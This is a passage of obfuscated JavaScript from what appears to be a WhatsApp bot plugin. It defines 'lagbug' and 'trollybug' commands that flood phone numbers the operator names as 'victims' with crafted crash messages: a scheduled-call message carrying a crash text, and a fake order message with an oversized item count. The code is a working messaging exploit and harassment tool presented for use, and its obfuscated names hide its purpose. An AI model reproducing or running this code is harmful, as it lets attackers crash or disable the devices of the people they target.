      if (_0x1ceca0.length > 0x0) {
        await _0x3e8fae("sending " + _0x51f00a + " bugs to " + _0x1ceca0.join(", "));
        try {
          await relaybug(_0x2e7ad0, _0x21e572, _0x4f6c2e, _0x3e8fae, _0x51f00a, _0x1ceca0, _0x5b1f12);
        } catch (_0x56ff5c) {
          await _0x3e8fae("An error occured");
          console.log("An error occured: " + _0x56ff5c);
          await react(_0x2e7ad0, _0x21e572, _0x4f6c2e, "âš ï¸");
        }
      } else {
        return await _0x3e8fae("No victims specfied");
      }
    }
  }
  await react(_0x2e7ad0, _0x21e572, _0x4f6c2e, 'âœ…');
});
smd({
  'pattern': "lagbug",
  'category': "dev",
  'reaction': "✅"
}, async (_0x493989, _0x5b6488, _0x1ed391) => {
  const {
    ms: _0x374052,
    arg: _0x204902,
    repondre: _0x316c20,
    superUser: _0x304c2c,
    prefixe: _0x209fc2
  } = _0x1ed391;
  if (!_0x304c2c) {
    return await _0x316c20("You are not authorised to use this command !!!");
  }
  if (!_0x204902[0x0]) {
    return await _0x316c20("Use " + _0x209fc2 + "lagbug amount | numbers\n> Example " + _0x209fc2 + "lagbug 30 |" + conf.NUMERO_OWNER + " or " + _0x209fc2 + "lagbug " + conf.NUMERO_OWNER.split(',')[0x0]);
  }
  await loading(_0x493989, _0x5b6488);
  const _0x55ebf5 = _0x204902.join('');
  let _0x28e3be = 0x1e;
  let _0x2be915 = [];
  const _0x6599b2 = {
    'scheduledCallCreationMessage': {
      'callType': '2',
      'scheduledTimestampMs': '' + moment(0x3e8).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss"),
      'title': bugtext2
    }
  };
  if (_0x204902.length === 0x1) {
    _0x2be915.push(_0x204902[0x0]);
    await _0x316c20("sending " + _0x28e3be + " bugs to " + _0x2be915[0x0]);
    try {
      await relaybug(_0x493989, _0x5b6488, _0x374052, _0x316c20, _0x28e3be, _0x2be915, _0x6599b2);
    } catch (_0x23e9c2) {
      await _0x316c20("An error occured");
      console.log("An error occured: " + _0x23e9c2);
      await react(_0x493989, _0x5b6488, _0x374052, "âš ï¸");
    }
  } else {
    _0x28e3be = parseInt(_0x55ebf5.split('|')[0x0].trim());
    if (_0x28e3be > conf.BOOM_MESSAGE_LIMIT || isNaN(_0x28e3be) || _0x28e3be < 0x1) {
      return await _0x316c20("amount must be a valid intiger between 1-" + conf.BOOM_MESSAGE_LIMIT);
    } else {
      _0x2be915 = _0x55ebf5.split('|')[0x1].split(',').map(_0x3aa4ae => _0x3aa4ae.trim()).filter(_0x369d1a => _0x369d1a !== '');
      if (_0x2be915.length > 0x0) {
        await _0x316c20("sending " + _0x28e3be + " bugs to " + _0x2be915.join(", "));
        try {
          await relaybug(_0x493989, _0x5b6488, _0x374052, _0x316c20, _0x28e3be, _0x2be915, _0x6599b2);
        } catch (_0x457eb2) {
          await _0x316c20("An error occured");
          console.log("An error occured: " + _0x457eb2);
          await react(_0x493989, _0x5b6488, _0x374052, "âš ï¸");
        }
      } else {
        return await _0x316c20("No victims specfied");
      }
    }
  }
  await react(_0x493989, _0x5b6488, _0x374052, "âœ…");
});
smd({
  'pattern': "trollybug",
  'category': "dev",
  'reaction': "✅"
}, async (_0x443342, _0x299b87, _0x18bf9e) => {
  const {
    ms: _0x4f8989,
    arg: _0x1ec87d,
    repondre: _0x3d0b24,
    superUser: _0x1039d3,
    prefixe: _0x3666fa
  } = _0x18bf9e;
  if (!_0x1039d3) {
    return await _0x3d0b24("You are not authorised to use this command !!!");
  }
  if (!_0x1ec87d[0x0]) {
    return await _0x3d0b24("Use " + _0x3666fa + "trollybug amount | numbers\n> Example " + _0x3666fa + "trollybug 30 |" + conf.NUMERO_OWNER + " or " + _0x3666fa + "trollybug " + conf.NUMERO_OWNER.split(',')[0x0]);
  }
  await loading(_0x443342, _0x299b87);
  const _0x61394d = _0x1ec87d.join('');
  let _0x2410ac = 0xf;
  let _0x47d686 = [];
  const _0x4f34dd = {
    'orderMessage': {
      'orderId': "599519108102353",
      'thumbnail': fs.readFileSync(path.resolve(path.join(__dirname, '..', "media", "deleted-message.jpg"))),
      'itemCount': 0x7cf,
      'status': 'INQUIRY',
      'surface': "CATALOG",
      'message': '' + conf.BOT,
      'orderTitle': " TROLLY BUG ",
      'sellerJid': "263785028126@s.whatsapp.net",
      'token': "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
    }
  };
  if (_0x1ec87d.length === 0x1) {
    _0x47d686.push(_0x1ec87d[0x0]);
    await _0x3d0b24("sending " + _0x2410ac + " bugs to " + _0x47d686[0x0]);
    try {
      await relaybug(_0x443342, _0x299b87, _0x4f8989, _0x3d0b24, _0x2410ac, _0x47d686, _0x4f34dd);
    } catch (_0x3fbc97) {
      await _0x3d0b24("An error occured");
      console.log("An error occured: " + _0x3fbc97);
      await react(_0x443342, _0x299b87, _0x4f8989, "âš ï¸");
    }
  } else {
    _0x2410ac = parseInt(_0x61394d.split('|')[0x0].trim());
    if (_0x2410ac > conf.BOOM_MESSAGE_LIMIT || isNaN(_0x2410ac) || _0x2410ac < 0x1) {
      return await _0x3d0b24("amount must be a valid intiger between 1-" + conf.BOOM_MESSAGE_LIMIT);
    } else {
      _0x47d686 = _0x61394d.split('|')[0x1].split(',').map(_0x2f59bf => _0x2f59bf.trim()).filter(_0x4731af => _0x4731af !== '');
      if (_0x47d686.length > 0x0) {
        await _0x3d0b24("sending " + _0x2410ac + " bugs to " + _0x47d686.join(", "));
        try {
          await relaybug(_0x443342, _0x299b87, _0x4f8989, _0x3d0b24, _0x2410ac, _0x47d686, _0x4f34dd);
        } catch (_0x3f533a) {
          await _0x3d0b24("An error occured");
          console.log("An error occured: " + _0x3f533a);
          await react(_0x443342, _0x299b87, _0x4f8989, "âš ï¸");
        }
      } else {
        return await _0x3d0b24("No victims specfied");
      }
    }
  }
  await react(_0x443342, _0x299b87, _0x4f8989, "âœ…");
});